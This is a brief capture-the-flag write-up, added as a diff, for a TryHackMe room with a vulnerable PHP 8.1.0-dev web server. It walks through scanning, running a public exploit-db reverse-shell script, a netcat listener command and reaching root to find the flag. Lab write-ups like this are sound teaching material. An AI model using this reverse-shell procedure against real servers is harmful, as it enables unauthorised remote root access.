@@ -1,0 +1,35 @@
+Hello,
+This is a writeup for the Agent T room: https://tryhackme.com/room/agentt
+The description for this box indicates is a vulnerable webserver.
+Once starting the box, I initially ran a rustscan and gobuster against it.
+The gobuster revealed that there were not other pages to attack and the focus should be on the mainpage.
+I proceeded to pull the header of the website with:
+
+curl -I <targetbox>
+
+This revealed the website i using php 8.1.0-dev.
+
+A quick search on exploit-db.com shows there is a python script to run to get an easy reverse shell.
+
+I downloaded to shell and set permissions to executable.
+chmod 744 <shell>.py
+
+Next step was to open up at netcat listner:
+nc -lvnp <port>
+
+Then run the shell:
+python3 <shell>.py <target> <attacker> <listening port>
+
+First I checked who I was:
+whoami
+
+Great, already root!
+Next, I asked for the working directory:
+pwd
+
+Then inspected the contents:
+ls -a
+
+I realized the flag was not in this folder, so I changed directories up a folder, inspecting the contents until I found the flag.
+
+Fun, fast and easy room.
